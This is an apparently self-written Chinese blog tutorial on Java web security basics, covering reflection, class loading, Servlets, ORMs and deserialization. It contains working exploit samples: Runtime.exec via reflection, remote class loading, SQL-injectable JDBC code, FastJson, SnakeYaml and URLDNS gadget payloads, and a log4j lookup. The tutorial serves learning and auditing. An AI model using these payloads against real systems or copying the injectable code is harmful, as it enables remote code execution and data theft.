---
title: "Weber 的自我修养 Ⅳ：Java 篇"
date: 2026-11-12T11:05:00+08:00
lastmod: 2026-11-12T11:05:00+08:00
draft: false
description: "Java 安全基础：反射与类加载、动态代理、Servlet 生命周期、Listener 与 Filter、JDBC/MyBatis/Hibernate 的 SQL 注入与预编译、原生与 FastJson/SnakeYaml 反序列化、URLDNS 链、JNDI 注入、log4j/Shiro/XStream、Spring 与 Actuator/Swagger/JWT/SpringSecurity"
tags: ["Web安全", "Java"]
categories: ["技术笔记"]
---

# 前言

一个 Web 狗的自我修养。


一个Web狗的自我修养

{{< alert "lightbulb" >}}
学了这么久了,也有一年了,浑浑噩噩的,抽课余时间学.还是很菜.又到了找班上的年纪.在此发现对于web的学习或者说对于整个安全方向的学习,我着相了,为什么这么说呢.我总是想着从基础一步一步堆上去,但殊不知基础这个东西太广泛我觉得应该是遇到一个去学一个,在学某个点的途中一定有你还不知道的其他点就tm跟goto一样再点进去看接着学.看多了就记住了.
{{< /alert >}}

# Java安全基础

## 反射&类加载

Java的反射机制（Reflection）是一种在**运行时动态操作类、接口、字段和方法**的能力，它打破了编译时的静态类型限制，使程序可以在运行时获取类的详细信息并进行操作 。反射的核心思想是通过**Class对象**获取类的元数据，然后使用`Field`、`Method`、`Constructor`等类操作对象的属性、方法和构造器。在java中我们说了万物皆对象，类也能看做一个对象。下面先来看几个获取类的demo

首先创建一个User类来演示

```java
package com.user;

public class User {
    public String name;
    public int age;
    private String address;
    protected String sex;

    public User() {

    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }

    public String getAddress() {
        return address;
    }

    public String getSex() {
        return sex;
    }

    public void setName(String name) {
        this.name = name;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public void setAddress(String address) {
        this.address = address;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    public User(String name, int age, String address,String sex) {
        this.name = name;
        this.age = age;
        this.address = address;
        this.sex = sex;
    }

    private User(String name, int age, String address) {
        this.name = name;
        this.age = age;
        this.address = address;

    }
}

```

下面就获取类

```java
import com.user.User;

public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        Class<?> aClass = Class.forName("com.user.User");//获取类
        System.out.println(aClass);


        User user = new User();//new 对象
        Class<?> aClass2 = user.getClass();//用对象的方法获取类
        System.out.println(aClass2);

        Class userClass = User.class;//用类的方法获取类
        System.out.println(userClass);

        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();//通过类加载器获取类
        Class<?> aClass3 = systemClassLoader.loadClass("com.user.User");
        System.out.println(aClass3);

    }
}
```

知道如何获取类了之后我们就能通过类来找到对象并且获取它的属性和属性值。

```java
import com.user.User;

import java.lang.reflect.Field;

public class GetFile {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {
        User user = new User("127",20,"cq","nan");//new一个user对象
        User user2 = new User("777",20,"cq","nan");
        Class<? extends User> clazz = user.getClass();//先获取类
        Class<?> clazz2 = user2.getClass();


        //获取public属性
        Field[] fields = clazz.getFields();
        for (Field field : fields) {
            System.out.println(field);
        }
        System.out.println("=========================================");
        //获取属性
        Field[] fields1 = clazz.getDeclaredFields();
        for (Field field : fields1) {
            System.out.println(field);
        }
        System.out.println("=========================================");
        //也可以带参数获取指定属性
        Field fields2 = clazz.getDeclaredField("sex");//获取属性
        Object o = fields2;//赋给一个对象变量
        System.out.println(o);
        System.out.println("=========================================");
        //修改属性值
        Field fields3 = clazz.getDeclaredField("name");//获取user的属性
        System.out.println(fields3.get(user));//取user这个对象的name属性的值
        fields3.set(user,"514");//修改属性值注意这里写的是对象不是类
        Field fields4 = clazz.getDeclaredField("name");
        System.out.println(fields4.get(user));//获取值
        Field fields5 = clazz2.getDeclaredField("name");//获取user2的属性
        System.out.println(fields5.get(user2));
    }
}

```

获取构造器

```java
import com.user.User;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class GetConstructor {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        User user = new User("127",20,"cq","nan");//new一个user对象
        User user2 = new User("777",20,"cq","nan");
        Class<? extends User> clazz = user.getClass();//先获取类
        Class<?> clazz2 = user2.getClass();

        //获取public的构造器
        Constructor<?>[] constructors = clazz.getConstructors();
        for (Constructor<?> constructor : constructors) {
            System.out.println(constructor);
        }
        System.out.println("============================================");
        //获取所有构造器
        Constructor<?>[] constructors1 = clazz.getDeclaredConstructors();
        for (Constructor<?> constructor : constructors1) {
            System.out.println(constructor);
        }
        System.out.println("============================================");
        //获取单个构造器，通过参数的类型来指定。
        Constructor<?> constructors2 = clazz2.getDeclaredConstructor(String.class,int.class,String.class);
        System.out.println(constructors2);
        System.out.println("============================================");

        //使用getDeclaredConstructor来获取私有构造器，获取属性那边可以类比
        Constructor<? extends User> constructors3 = (Constructor<? extends User>) clazz2.getDeclaredConstructor(String.class,int.class,String.class);//拿的私有
        constructors3.setAccessible(true);//开锁
        User user1 = constructors3.newInstance("555",18,"gd");
        System.out.println(user1.getAge());
        System.out.println(user1.getName());
        System.out.println(user1.getAddress());
        System.out.println(user1.getSex());//sex 是 null，因为私有构造器只有三个参数，sex 没被赋值。

    }
}

```

> `getConstructor`：只能拿到 `public` 构造器，**它本来就不需要权限放行**，就算你不写 setAccessible 也能调用； `getDeclaredConstructor`：可以拿到 private/protected/default 构造器，**拿到对象之后，默认权限检查还是开着的，必须 setAccessible (true) 才能调用 newInstance**。

```java
import com.user.User;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class GetMethods {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        User user = new User("127",20,"cq","nan");//new一个user对象
        User user2 = new User("777",20,"cq","nan");
        Class<? extends User> clazz = user.getClass();//先获取类
        Class<?> clazz2 = user2.getClass();


        //获取所有方法如get set方法。但是他不获取继承的方法
        Method[] module = clazz.getDeclaredMethods();
        for (Method m : module) {
            System.out.println(m);
        }
        System.out.println("============================================");
        Method[] methods = clazz.getMethods();
        for (Method m : methods) {
            System.out.println(m);
        }
        System.out.println("============================================");
        //单个获取无参数
        Method getAge = clazz2.getDeclaredMethod("getAge");
        System.out.println(getAge);
        //单个获取有参数的
        Method setAge = clazz2.getDeclaredMethod("setAge", int.class);
        System.out.println(setAge);
        System.out.println("============================================");
        Method setname = clazz2.getDeclaredMethod("setName", String.class);
        System.out.println(user.getName());
        setname.setAccessible(true);
        setname.invoke(user,"gya");//调用方法
        System.out.println(user.getName());
        
    }
}

```

![image-20261107163629038](image-20261107163629038.png)

我们来看一个实例demo

```java
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class demo_exec {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        //Runtime.getRuntime().exec("calc");假如要触发这个。用反射来写


        //获取类Runtime在lang包下"java.lang.Runtime"
        Class<?> r =  Class.forName("java.lang.Runtime");//获取类
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();//通过构造器获取类
        Class<?> runtime = systemClassLoader.loadClass("java.lang.Runtime");


        //取方法集
//        Method[] methods = r.getDeclaredMethods();
//        for (Method method : methods) {
//            System.out.println(method.getName());
//        }
        //取方法getRuntime
        Method getRuntime = r.getDeclaredMethod("getRuntime");
        //取方法exec()
        Method exec = r.getDeclaredMethod("exec", String.class);
        //调用exec
        exec.setAccessible(true);//开锁
        Object runexec = getRuntime.invoke(null);//静态方法保险的就写null
        exec.invoke(runexec,"calc");
    }
}

```

也可以这样写，调用它的构造器来执行。

```java
 //通过构造器取调用
        Constructor<?>cmd  = r.getDeclaredConstructor();//获取构造器
        cmd.setAccessible(true);//开锁
        Object CMD = cmd.newInstance();//构造器new一个对象
        //通过这个对象获取方法
        Method c = r.getDeclaredMethod("exec", String.class);
        c.invoke(CMD, "calc");
```

但是这个写法java9以后都会报错，不推荐。我们说一下类加载机制的demo吧，这个分两种远程加载和本地加载，本地加载呢比如说本地我知道有个路径有个恶意类或者攻击者写入的一个恶意类可能如下

```java
public class Evil{
    static{
        try{Runtime.getRuntime().exec("calc");}catch(Exception e){}
    }
}
```

javac 编译一下。然后看看本地和远程的不同demo

```java
import java.io.File;
import java.io.FileInputStream;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;


import javax.print.DocFlavor;

public class loader_demo {
    public static void main(String[] args) throws Exception {
        File file = new File("e:/");//文件所在路径
        URI uri = file.toURI();
        URL url = uri.toURL();

        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class<?> clazz = loader.loadClass("Evil");//恶意类名，注意和类名大小写一致
        clazz.newInstance();//触发


    }
}

```

这是一个本地的。下面是一个远程的

```java
import java.net.URL;
import java.net.URLClassLoader;

public class loder_demo_http {
    public static void main(String[] args) throws Exception {

        URL url = new URL("http://xxx.baxdu.com");//加载远程地址
        try(URLClassLoader loader = new URLClassLoader(new URL[]{url})) {
            Class<?> clazz = loader.loadClass("Evil");//文件名，注意和类名大小写一致
            clazz.newInstance();//触发
        }

    }
}

```

总结几个重要的其实就是要理解它的API在干什么怎么用的，毕竟我们不是专业开发，getMethod啊，getConstructor啊这些看得懂就行了当然还有invoke。可以用工具生成几个java的内存马看看还是大抵看得懂目前的话。

## 动态代理

> 此处只说jdk动态代理，Java 动态代理位于 `java.lang.reflect` 包下，我们一般就仅涉及 `java.lang.reflect.Proxy` 类与 `InvocationHandler` 接口,使用其配合反射，完成实现动态代理的操作。InvocationHandler接口：负责提供调用代理操作。是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。

所以说就是动态代理会去自动调用InvocationHandler.invoke()然后在反射中我们知道可以用通过反射机制invoke来调用任意类的任意方法就有可能导致RCE。当然这只是为java反序列化铺垫以一个最简单的demo来看其中涉及两个关键的类，代理类和处理器

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class Userproxy  {

    public static void main(String[] args) {
        //检测目标对象
        User user = new Userimtp();
        //创建userimptinhandle
        UserinptInHandler userinptInHandler = new UserinptInHandler(user);



        //创建处理对象
            User proxy = (User) Proxy.newProxyInstance(
                    Userimtp.class.getClassLoader(),
                    new Class<?>[]{User.class},
                userinptInHandler //第三个参数
        );
        proxy.say("xiaoming");
    }
}

```

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class UserinptInHandler implements InvocationHandler {
    private Object target;
    public UserinptInHandler(Object target) {
        this.target = target;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("i am "+ args[0]);
        Object result = method.invoke(target, args[0]);
        System.out.println("ok");
        return result;
    }
}
```

可以知道最后实际动手的还是处理器，处理器里面的"invoke"

## Servlet

**"Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。使用 Servlet，可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。"这个技术虽然说比较老了但是却是作为后面的一个基石一般的东西存在。使用idea构建一个项目然后启动>**![image-20261105164230703](image-20261105164230703.png)

这里有一个坑tomcat10+的版本不再使用javax而是jakarta。所以这里我先去降个版本。![image-20261105165719632](image-20261105165719632.png)

先来看自动生成的这样的一个demo，`@WebServlet(name = "helloServlet", value = "/hello-servlet")`这一行给我们的信息是这个路由这个组件名字是helloServlet这是给web.xml读的，而后面那个/hello-servlet才是路由也就是我们实际访问的地方。doget方法中写了当使用http协议发get请求的时候干了什么事。就是返回了一个message。这个message的内容也在init()中定义了。我们来在同目录下自己写一个demo。

```java
public class Demo1 extends HttpServlet {
    @Override
    public void init() throws ServletException {
        System.out.println("初始化 init完成");
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("使用get请求访问");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("使用post请求访问");
    }

    @Override
    public void destroy() {
        System.out.println("销毁访问");
    }
}
```

同时需要在web.xml中去声明。当然等价的写法就是注解

`@WebServlet(name = "index",value = "/index")`直接加在类名上就是public...上面。

```xml
    <servlet>
        <servlet-name>index</servlet-name>
        <servlet-class>org.example.demo1.Demo1</servlet-class>
    </servlet>
    
    <servlet-mapping>
        <servlet-name>index</servlet-name>
        <url-pattern>/index</url-pattern>
    </servlet-mapping>
```

声明/index路由实际映射的文件是我们刚刚写的那个Demo1。看看效果

![image-20261105171219293](image-20261105171219293.png)

![image-20261105171309542](image-20261105171309542.png)

post也是一样的，然后关闭容器的时候也会提示销毁。这里没截图可以自己试试。我们来写一个接收参数的demo

```java
@Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String name = req.getParameter("name");
        resp.setContentType("text/html;charset=utf-8");//规定字符集和设置响应头ContentType
        PrintWriter out = resp.getWriter();
        out.println(name);//打印参数值
        System.out.println("使用get请求访问");
    }
```

![image-20261105185613461](image-20261105185613461.png)

POST也是一样的这里不多演示。所有我们可以得到servlet的生命周期如下图![Servlet 生命周期](servlet-lifecycle.jpg)

## Listener和Filter

![image-20261105191646005](image-20261105191646005.png)

别管，豆包画的别管。过滤器Filter顾名思义就是拦截请求进行过滤处理，也可以对响应进行处理。常见的payload的检测，内存马这些都在这一层处理。我们来看一个xss过滤器的demo

```java
@WebFilter(value = "/index")
public class ez_filter implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        String req = request.getParameter("name");
        if(req.contains("<script>")){
            System.out.println("xss注入!");

        }else {
            filterChain.doFilter(servletRequest,servletResponse);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }
}
```

首先这是一个接口我们要实现他的几个方法。你要拦截 `/index` 就写 `@WebFilter("/index")`；想全部拦截写 `@WebFilter("/*")`拦截规则自己定义就行。Listener又称监听器，用于对Web应用中特定的事件进行监听。当被监听的事件发生时，Listener将会触发对应的方法来实现一些特殊的功能。一个Listener就是一个实现特定接口的java类，它用于监听另一个Java类对象的方法调用或属性改变，当被监听的对象出现方法调用或属性改变后，Listener的某个方法将立即被执行。以一个session的监听器demo为例

```java
package org.example.demo1.listener;


import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpSessionEvent;
import javax.servlet.http.HttpSessionListener;

@WebListener //监听器全局生效，不接路由参数
public class listener_session implements HttpSessionListener {
    @Override
    public void sessionCreated(HttpSessionEvent se) {
        HttpSessionListener.super.sessionCreated(se);
        System.out.println("session created" + se.getSession().getId());
    }

    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        HttpSessionListener.super.sessionDestroyed(se);
        System.out.println("session destroyed" + se.getSession().getId());
    }
}
```

其实就是一个类似于触发器的东西，一旦满足什么条件就如何如何。

## ORM

ORM（Object-Relational Mapping，对象关系映射）是一种将面向对象编程语言中的对象与关系型数据库中的表进行映射的技术，使开发者可以通过操作对象而非直接编写SQL来访问数据库。 常见的有 MyBatis、Hibernate，而 JDBC 是 Java 连接数据库最底层的方式，严格说它不算 ORM，先从它看起。

### jdbc

jdbc是java原生的数据库连接形式。我们来写一个demo看看

```java
@WebServlet(name="jdbc",value = "/jdbc")
public class jdbc extends HttpServlet {

    String url = "jdbc:mysql://localhost:3308/java_study";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String id = req.getParameter("id");
        String sql = "select * from user where id = '" + id + "'";
        try{
            // 显式加载（现代JDBC中通常可省略）
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection con = DriverManager.getConnection(url, "root", "<你的数据库密码>");
            //System.out.println(con);//打印连接信息
            Statement st = con.createStatement();
            ResultSet rs = st.executeQuery(sql);
            while(rs.next()){
                resp.getWriter().println(rs.getString("id"));
                resp.getWriter().println(rs.getString("name"));
                resp.getWriter().println(rs.getString("password"));
            }

        } catch (ClassNotFoundException | SQLException e) {
            throw new RuntimeException(e);
        }
    }
}
```

数据库我随即生成了点数据

![image-20261106144823073](image-20261106144823073.png)

![image-20261106144902305](image-20261106144902305.png)

这样子直接拼接没有任何过滤就会造成sql注入。

![image-20261106145711903](image-20261106145711903.png)

如何防范呢？最常见的就是预编译的写法

```java
@WebServlet(name="jdbc",value = "/jdbc")
public class jdbc extends HttpServlet {
    String url = "jdbc:mysql://localhost:3308/java_study";
    String user = "root";
    String pwd = "<你的数据库密码>";

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String id = req.getParameter("id");
        // 占位符 ?，不再拼接字符串
        String sql = "select * from user where id = ?";

        try{
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection con = DriverManager.getConnection(url, user, pwd);
            PreparedStatement pst = con.prepareStatement(sql);
            // 给第一个占位符赋值
            pst.setString(1, id);
            ResultSet rs = pst.executeQuery();//这里是无参了注意

            while(rs.next()){
                resp.getWriter().println(rs.getString("id"));
                resp.getWriter().println(rs.getString("name"));
                resp.getWriter().println(rs.getString("password"));
            }

            // 关闭资源
            rs.close();
            pst.close();
            con.close();
        } catch (ClassNotFoundException | SQLException e) {
            throw new RuntimeException(e);
        }
    }
}
```

![image-20261106151314570](image-20261106151314570.png)

这就防住了嘛。

### Mybatis

这个我们注意看这样几个xml文件这个是 mapper 的 xml

```xml
<mapper namespace="org.example.mapper.UserMapper">
    <!-- #{id} 预编译，防SQL注入；${id} 字符串拼接，会注入 -->
    <select id="selectById" resultType="org.example.entity.User">
        select * from user where id = #{id}
    </select>
</mapper>
```

也就是说把这里的`#{id}`改成`${id}`就防不住。当然还有config的xml

![image-20261106161537930](image-20261106161537930.png)

这个一般用来存数据库连接信息的，当然你说那我不叫这个名字怎么办，那确实，所以这方面是根据开发习惯来的而且现在大多数的vibecoding也存在这种习惯。它是在 mapper.xml 这样的文件中写的 sql 语句然后在servlet那边接收参数然后引用这个文件就行了

### Hibernate

这个东西直接使用注解映射不写xml

```java
package org.example.entity;
import jakarta.persistence.*;

@Entity
@Table(name = "user")
public class User {
    @Id
    private Integer id;
    private String name;
    private String password;

    public Integer getId() { return id; }
    public void setId(Integer id) { this.id = id; }
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public String getPassword() { return password; }
    public void setPassword(String password) { this.password = password; }
}
```

而它的查询语句也是写在servlet中的所以不去xml去找。安全写法如下也是用预编译

```java
// 安全，:uid 是占位符，预编译
String hql = "from User where id = :uid";
Query<User> query = session.createQuery(hql, User.class);
query.setParameter("uid", input);
```

预编译不会改变sql语句的结构就像把输入当字符串处理而不过滤的情况就是把输入当作sql语句执行了那么原本sql语句结构就改变了。



## 序列化&反序列化

### 原生

这个的概念在php中提到过了那么简单提一下就行，序列化就是对象转换为数据，反序列化是它的逆过程。先给出反序列化和序列化的代码

```java
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Unserialize {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
      Object o =  Unserialize("test.txt");
        System.out.println(o);
    }

    public static Object Unserialize(String file) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
        Object o = ois.readObject();
        return o;
    }
}

```

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class Serialize {
    public static void main(String[] args) throws Exception {
        Test test = new Test("ll",999);

        Serialize(test);

    }

    public static void Serialize(Object obj) throws Exception {

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.txt"));

        oos.writeObject(obj);

    }
}

```

和php一样我们如果可以控制危险类如这样子

```java
import java.io.IOException;
import java.io.Serializable;

public class Test implements Serializable {

    public String name;
    public int age;
    public Test(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        try {
            cmd("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return "name: " + name + ", age: " + age;
    }

    public static void cmd(String cmd) throws IOException {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}

```

可以看到反序列化后我们`print(o)`了然后就会自动触发toString方法，然后我们的toString方法就会调用我们写的恶意的cmd方法就执行了。当然还有其他的钩子例如readObject，这个会在反序列化的时候默认触发。

```java
private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
```

其实和php反序列化的流程大致是一样的，如果我们反序列化的对象可控的话就很好搞了，我们直接写个恶意类序列化后传给反序列化触发就行了。其实在java中反序列化的触发可以分为两种，一种是通过原生的api去触发另一种是通过外部库去触发，通过前面的介绍我们知道可以通过readObject来触发嘛那么原生的api中也有相应的构造链。我们先缕一缕基本流程，找入口->找到可控的地方。所以一个常规思路就是找readObject方法。

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    /**
//        hashmap-> hashmap.readObject->put(key，value)->putVal(hash(key))->hash->key.hashCode()->handler.hashCode=URLStreamHandler.hashCode->URLStreamHandler.hashCode.getHostAddress()
     如果key可控的情况下比如控为URL

     创建hashmap
     创建url连接
     调用put方法把url数据存进去，触发puVal(hash(key))
     调用key.hashCode()
     让hashCode的值为-1调用handler.hashCode最终调用getHostAddress
     */
    public static void Serialize(Object obj) throws Exception {

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));

        oos.writeObject(obj);

    }


    public static void main(String[] args) throws Exception {
        HashMap<URL,Integer> objectHashMap =  new HashMap<>();//创建HASHMAP
        URL url = new URL("http://jufmephemx.yutu.eu.org");//创建URL连接
        Class<? extends URL> clazz = url.getClass();//获取url类为反射调用方法做准备
        Field hashCode =  clazz.getDeclaredField("hashCode");//获取hashCode方法
        hashCode.setAccessible(true);//开锁便于改-1
        hashCode.set(url,114514);
        objectHashMap.put(url,1);//会自动调用URL的hashCode方法
        hashCode.set(url,-1);
        Serialize(objectHashMap);//序列化入口去触发


    }
}

```

可以自己试试注意不要开VPN本地测试的时候。这里先赋值了一个其他值再赋值-1是因为![image-20261109203655392](image-20261109203655392.png)

HashMap这个类里面本身有一个put方法它返回的是putVal(hash(key))。

![image-20261109204519817](image-20261109204519817.png)

而URL类里面的hashCode方法描述到如果不为-1才返回hashCode。不然就会直接调用handler.hashCode然后这个hashCode里面有我们的目标

![image-20261109205829150](image-20261109205829150.png)

getHostAddress()所以不能一开始就设置为-1。下面我们来看一个**FastJson**的嘛。

### FastJson

是一个三方库，提供了JSON与对象的相互转换。

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class FastJsonDemo {
    public static void main(String[] args) {
        User coinsheep = new User("ll",18);
        String jsonString = JSON.toJSONString(coinsheep);
        System.out.println(jsonString);
        System.out.println("========================================");

        //反序列化方式1这种情况会执行类的set方法和无参构造器
        User coinsheep2 = JSON.parseObject(jsonString, User.class);
        System.out.println(coinsheep2);
        System.out.println("========================================");
        //反序列化方式2
        JSONObject jsonObject = JSON.parseObject(jsonString);
        System.out.println(jsonObject);
        System.out.println("========================================");
        //反序列化方式3
        Object jsonObject1 = JSON.parse(jsonString);
        System.out.println(jsonObject1);
        System.out.println("========================================");
    }
}

```

有三种反序列化的方法其中第一种会默认使用无参构造器和调用set方法。而如果序列化的时候我们这样写`String jsonString2 = JSON.toJSONString(coinsheep, SerializerFeature.WriteClassName);`那反序列化的三种方法都会调用 setter 和触发构造器，第二种方法还会调用get方法。来看一个最简单的demo

```java
import com.alibaba.fastjson.JSON;

public class FastJsonDemo {
    public static void main(String[] args) {
        // 把下面payload传入，漏洞点：JSON.parseObject
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}";
        JSON.parseObject(payload);
    }
}
```

`@type` 指定类，fastjson 自动实例化 `JdbcRowSetImpl`，`autoCommit=true` 触发 `setAutoCommit` -> 调用 `connect()` -> 去 `dataSourceName` 的 ldap 地址拉取远程类并执行。

### SnakeYaml

这个是一个java的yaml序列化操作的库SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。和之前的那些理解是一样的，就是yaml文件和java对象之间的互相转换。load 是反序列化，会调用构造器和 setter；dump 是序列化，会调用 getter所以打法基本和fastjson他们的思路差不多，网上也有很多的链子最经典的莫过于jdk原生的这条链子基本和Fastjson的构造是一样的嘛反正都是原生链子

```java
import org.yaml.snakeyaml.Yaml;

public class PocTest1 {
    public static void main(String[] args) {
        String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://example/evil, autoCommit: true}";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

特殊的是ScriptEngineManager链这个涉及到 **SPI 机制**，即 JDK 内置的一种服务提供发现机制。它的利用方式是通过在ClassPath路径下的META-INF/services文件夹下查找文件，自动加载文件中所定义的类。远程文件加载机制嘛之前也是提到过的直接看demo

```java
import org.yaml.snakeyaml.Yaml;

public class script {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8989/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

可以自己本地用python起服务当然公网可能需要vps。https://github.com/artsploit/yaml-payload/tree/master 可以看这个是别人写好的poc但是要注意就是打jar包的时候要注意版本项目要和运行环境一致。

## Jndi

JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。反正就是定义了 JNDI 接口就可以通过 API 访问系统的命名服务和目录服务。

Jndi注入

JNDI 注入，即当开发者在定义 `JNDI` 接口初始化时，`lookup()` 方法的参数可控，攻击者就可以将恶意的 `url` 传入参数远程加载恶意载荷，造成注入攻击。这里只是基础部分我不在此处深究大家可以看这一篇文章https://xz.aliyun.com/news/11723。本地复现的时候要注意用jdk8高版本的包名有问题需要修改VM参数强制运行但是JDK21好像不行了，使用reference+codebase拉远程类这个貌似不行了，我没有复现出来。

## 三方库

java庞大的生态使得它有很多外部库比如log4j，struts(这个太老了)，shiro等。这里提几个常见的，不做多的分析，审计的关注点也是我们在jndi那里提到的lookup()这个方法。攻击者做的不过是找反射触发它包括log4j2也是一样的。这里笔者只放几篇文章大家过过眼，后面也许会写专题。

**log4j/log4j2**

log4j是一种日志组件，这个得看应用有没有日志功能还有就是是什么语言的后端，黑盒中如果说一个站点有这种日志功能而且是java应用开发的那可能你得往这边怀疑。log4j支持用这样的表达式写法来执行代码命令

```java
public void test() {
        log.info("${java:os}");
}
```

https://zhuanlan.zhihu.com/p/663599896

https://blog.csdn.net/qq_33370213/article/details/157151696

https://mp.weixin.qq.com/s?src=11&timestamp=1794295861&ver=7079&signature=H1cec1a0Trjfck0IIo2MZsUq36CC-YA8S4dgh1X7l6Bf4mffHNNoGJiVBd5Vck9QILToeTLIKgrGWo2dOi3flwN3QGhTfC3g-YqbYQVUXrJgJVR4KE54Ww5vbGGFVIFI&new=1

**fastjson/fastjson2**

这个相对特殊一点就是它每个版本的利用方式和poc都有差异很少是那种影响好几个版本那种漏洞。这个的思路就是如果是黑盒的话推荐直接抓包看是不是进行了json化处理传输数据，有的话而且是java应用就可以直接payload试试。白盒的话拿到直接看外部库看版本信息然后找序列化的地方在哪儿就比如JSON.parse(parameter)然后跟踪传入的参数是否可控。

```tex
https://1diot9.github.io/2026/08/04/Fastjson1%E5%85%A8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/

https://mp.weixin.qq.com/s?src=11&timestamp=1794295386&ver=7079&signature=m5jd6pC4w0zd7SRxjbz5U3kt4HO9SIH3HkDicpxc*s7zt7Un1timMGcnk9M5QldIIlfb-uXBBeozOvSl8bWIMLPZM9UhumjYw9CaybisE-lMsDrJ89RRK5ibRPH4u67m&new=1
```

**Xstream**

这个库是让java对象和xml之间进行转换。和fastjson差不多的，也是看反序列化的输入是否可控。XStream 对类没有实现 Serializable 的要求，普通对象直接反射转换，这是它和原生序列化最大的区别；常见的打点还是反序列化输入是否可控，进阶的就上 CVE 了。

```tex
https://mp.weixin.qq.com/s?src=11&timestamp=1794297132&ver=7079&signature=vHt0UF0WgMGP9-wJQLqBQ2BwU3Ax8uROEThnsSwULAz*37gkbldHRH8-al6XhCgVR*RoCfvIzNrZvz4OZ7jUHK7wEzWLe2IQ1y3RXT9xPE4GVZTqkGg3YkMqRMb2w82Q&new=1
```

**shiro**

Shiro 是一个开源的 Java 安全框架，由 Apache 开发和维护。Shiro 可以帮助开发人员快速实现安全特性，包括身份认证、授权、加密和会话管理等。Shiro 的目标是简化 Java 安全编程，并提供更好的开发体验。

先起一个环境

![image-20261110174618539](image-20261110174618539.png)

然后上工具一把梭，以后辨识度也就是remeberMe，赛题可以参考十九届CISCN半决赛的渗透签到直接工具一把梭。实际构造的文章如下

```tex
